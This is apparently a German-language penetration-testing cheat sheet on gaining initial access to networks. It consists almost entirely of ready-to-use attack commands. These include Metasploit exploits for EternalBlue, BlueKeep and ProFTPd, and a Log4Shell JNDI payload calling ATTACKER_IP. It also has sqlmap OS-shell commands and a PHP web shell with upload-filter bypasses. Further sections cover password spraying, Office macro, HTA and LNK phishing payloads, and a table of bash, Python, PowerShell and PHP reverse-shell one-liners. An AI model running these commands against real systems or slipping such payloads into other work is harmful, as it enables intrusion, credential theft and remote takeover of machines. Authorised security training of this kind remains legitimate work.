# 🚪 Phase 1: Erstzugang (Initial Access)

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Ziel:** Einen ersten Zugang zum Zielnetzwerk oder Zielsystem erlangen.

---

## 🎯 Angriffsvektoren

| Vektor | Beschreibung |
|--------|-------------|
| **Öffentlich erreichbare Anwendung ausnutzen** | Schwachstellen in Webanwendungen, APIs und CMS |
| **Phishing** | Schädliche E-Mails mit Payloads (auszuführender Schadcode) |
| **Gültige Zugangsdaten** | Password Spraying und Credential Stuffing |
| **Externe Dienste** | Öffentlich erreichbare RDP-, SSH-, VPN- und FTP-Dienste |
| **Lieferkette (Supply Chain)** | Vertrauenswürdige Software kompromittieren |

---

## 💻 Bekannte Schwachstellen ausnutzen

### Nach Exploits suchen
```bash
# SearchSploit – Lokale Exploit-Datenbank
searchsploit apache 2.4
searchsploit -m 41234  # Exploit in das aktuelle Verzeichnis kopieren
searchsploit --nmap scan.xml  # Nmap-Ergebnisse auswerten

# Suche in Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Häufig verwendete Exploits

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Auf Verwundbarkeit prüfen
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Mit Metasploit ausnutzen
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Auf die Schwachstelle testen
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Exploit-Server einrichten
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Auf ProxyShell prüfen
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Exploit verwenden
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Angriffe auf Webanwendungen

### SQL Injection (Shell erlangen)
```bash
# Auf SQL Injection testen
sqlmap -u "http://target.com/page?id=1" --batch

# Über SQL Injection eine Betriebssystem-Shell erlangen
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL-Shell öffnen
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Über einen Datei-Upload eine Shell erlangen
```bash
# PHP-Reverse-Shell erstellen
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Alternativ eine einfache PHP-Shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Filter für Dateiendungen umgehen
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Remote Code Execution (RCE, entfernte Codeausführung)
```bash
# Auf RCE testen
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Reverse Shell über RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Angriffe auf Zugangsdaten

### Password Spraying (Passwörter breit gestreut prüfen)
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential Stuffing (geleakte Zugangsdaten wiederverwenden)
```bash
# Bekannte geleakte Zugangsdaten verwenden
hydra -C creds.txt ftp://192.168.1.10

# Format für creds.txt:
# username:password
```

### Standardzugangsdaten
```bash
# Häufige Standardzugangsdaten zum Prüfen:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec mit gängigen Zugangsdaten
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Phishing-Payloads

### Payload als Office-Makro
```bash
# Makro-Payload erzeugen
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Alternativ msfconsole verwenden
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### HTA-Payload
```bash
# HTA-Datei erzeugen
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Datei bereitstellen
python3 -m http.server 80
```

### LNK-Payload
```powershell
# Schädliche Verknüpfung erstellen
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Externe Dienste ausnutzen

### RDP ausnutzen
```bash
# RDP per Brute Force prüfen
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### SSH ausnutzen
```bash
# SSH per Brute Force prüfen
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH mit bekannten Zugangsdaten
ssh user@192.168.1.10

# SSH mit privatem Schlüssel
ssh -i id_rsa user@192.168.1.10
```

### FTP ausnutzen
```bash
# Anonyme Anmeldung
ftp 192.168.1.10
# Benutzername: anonymous
# Passwort: anonymous

# Brute Force
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# ProFTPd-Exploit
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Listener einrichten

### Netcat-Listener
```bash
nc -lvnp 4444
```

### Metasploit-Handler
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# Auf dem Angreiferrechner
powercat -l -p 4444

# Auf dem Zielsystem
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Kurzreferenz

### Reverse Shells als Einzeiler

| OS | Befehl |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Weiterführende Cheatsheets

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [Web-Schwachstellen](../../SSRF/README.md)

---

**Nächste Phase:** [02 - Enumeration/Erkundung →](./02-Enumeration.de.md)

---

## Hinweise zur deutschen Ausgabe

> **Begriffe und Versionshinweis:** *Password Spraying* prüft wenige Passwörter bei vielen Konten; *Credential Stuffing* verwendet bereits bekannte Benutzername-Passwort-Paare. Die gezeigten Hydra-Aufrufe mit `-L` und `-P` prüfen dagegen Kombinationen aus zwei Listen. Eine *Reverse Shell* verbindet sich vom Zielsystem zurück zum Listener. Die Beispiele zeigen historische Schwachstellen und Filterumgehungen; ihre Anwendbarkeit hängt von Version und Konfiguration ab. `JNDI-Exploit.jar`, `proxyshell_exploit.py` und das genannte ProxyShell-NSE-Skript sind vorausgesetzte externe Dateien bzw. Erweiterungen, deren Vorhandensein diese Anleitung nicht belegt.
